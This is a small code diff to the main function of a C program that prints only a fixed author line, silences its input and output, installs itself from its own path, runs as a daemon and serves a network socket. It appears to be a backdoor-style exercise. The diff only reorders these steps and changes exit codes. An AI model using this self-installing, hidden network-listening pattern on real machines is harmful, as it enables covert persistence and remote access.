@@ -28,20 +28,24 @@ int main(int ac, char **av)
 	if (!success)
 		return (1);
 
-	setup_cleanup();
-
 	//THE ONLY AUTHORISED PRINT
 	printf("jmaia dhubleur\n");
 
+	if (!daemonize())
+	{
+		release_lock();
+		return (2);
+	}
+
+	setup_cleanup();
 	disable_input_output();
 
 	if (!install(av[0]))
-		return (2);
+		return (3);
 	
-	daemonize();
 	int sockfd = prepare_socket();
 	if (sockfd == -1)
-		return (3);
+		return (4);
 	poll_routine(sockfd);
 }
 
